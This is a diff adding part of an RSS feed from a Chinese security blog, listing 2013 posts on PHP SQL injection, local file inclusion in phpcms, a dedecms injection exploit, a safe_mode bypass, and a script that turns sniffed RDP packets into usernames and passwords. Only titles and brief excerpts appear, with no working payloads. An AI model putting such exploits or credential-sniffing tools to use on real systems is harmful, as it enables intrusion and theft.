+      <description>在注册的时候，输入用户名后台会验证用户名是否存在，当然是通过ajax去验证的也就是ajax.php。很多程序多会忽略这个导致存在SQL注入。</description>
+    </item>
+    
+    <item>
+      <title>phpcms v9 本地文件包含漏洞超详细分析</title>
+      <link>https://lcx.cc/post/3415/</link>
+      <pubDate>Tue, 09 Apr 2013 11:02:28 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3415/</guid>
+      <description>漏洞作者: b4dboy&amp;nbsp; 博客：http://www.secoff.net/ 漏洞分析：Seay 博客：http://www.cnseay.com/ 转载请保留</description>
+    </item>
+    
+    <item>
+      <title>查找 php webshell 小工具</title>
+      <link>https://lcx.cc/post/3407/</link>
+      <pubDate>Mon, 08 Apr 2013 08:58:43 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3407/</guid>
+      <description>思路就是匹配脚本文件以及配置文件hash，找出hash改变的脚本或者配置文件，脚本共三个参数 1，-save 即读取web目录和配置文件，计算h</description>
+    </item>
+    
+    <item>
+      <title>PHP脚本程序源码，采集百度下拉框的数据</title>
+      <link>https://lcx.cc/post/3347/</link>
+      <pubDate>Wed, 27 Feb 2013 11:54:39 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3347/</guid>
+      <description>&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34;&amp;gt; &amp;lt;link type=&#34;text/css&#34; rel=&#34;stylesheet&#34; href=&#34;http://zone.wooyun.org/themes/wooyun/css/style.css&#34;/&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;?php /* another:VIP date:2013-2-26 */ $word=$_GET[&#39;word&#39;]; if ($word==&#34;&#34;) { echo &amp;lt;&amp;lt;&amp;lt;EOF &amp;lt;form action=&#34;&#34; method=&#34;get&#34;&amp;gt; &amp;lt;p&amp;gt;关键词: &amp;lt;input type=&#34;text&#34; name=&#34;word&#34; /&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;input type=&#34;submit&#34; value=&#34;采集&#34; /&amp;gt; &amp;lt;/form&amp;gt; EOF; } else { $data=file_get_contents(&#39;http://suggestion.baidu.com/su?wd=&#39;.$word); $data=mb_convert_encoding($data, &#39;UTF-8&#39;, &#39;UTF-8,GBK,GB2312,BIG5&#39; ); $data_temp=strpos($data,&#34;x&#34;); $data=substr_replace($data,&#34;&#34;,$data_temp,17); $data = trim($data,&#34;);&#34;);</description>
+    </item>
+    
+    <item>
+      <title>关于PHP安全配置绕过问题的一些说明</title>
+      <link>https://lcx.cc/post/3321/</link>
+      <pubDate>Tue, 05 Feb 2013 21:05:17 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3321/</guid>
+      <description>前几天在wooyun上发布了个漏洞：WooYun: PHP safe_mode等安全配置绕过 这里有一些有意思的地方，主站不方便讨论，发到zone里做</description>
+    </item>
+    
+    <item>
+      <title>Cain嗅探到的RDP包批量解析为用户名&#43;密码的php脚本</title>
+      <link>https://lcx.cc/post/3307/</link>
+      <pubDate>Mon, 28 Jan 2013 17:31:31 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3307/</guid>
+      <description>昨天晚上开始嗅探，好家伙好几百个包，网上搜了一下有一款工具叫“Cain RDP Parser”，好家伙，一个一个选，玩死人的。。。索性写了个PHP脚</description>
+    </item>
+    
+    <item>
+      <title>[通杀]dedecms plus/search.php 注入漏洞利用EXP</title>
+      <link>https://lcx.cc/post/3289/</link>
+      <pubDate>Sun, 20 Jan 2013 14:51:52 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3289/</guid>
+      <description>转载不加作者名的没JJ 哎。没意识，我一个月前就发现了这个漏洞，一直也没去黑站&amp;nbsp;&amp;nbsp;放那 现在狗卵的什么 知道创宇 发出来了。郁闷</description>
+    </item>
+    
+    <item>
+      <title>php包含那点事情</title>
+      <link>https://lcx.cc/post/3250/</link>
+      <pubDate>Thu, 03 Jan 2013 19:34:16 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3250/</guid>
+      <description>有空就多整理下曾经研究过的知识和需要温顾的知识,明年可能去寻工作络. 关于PHP中LFI(Local File Include,本地文件包含)漏洞,大家</description>
+    </item>
+    
+  </channel>
+</rss>
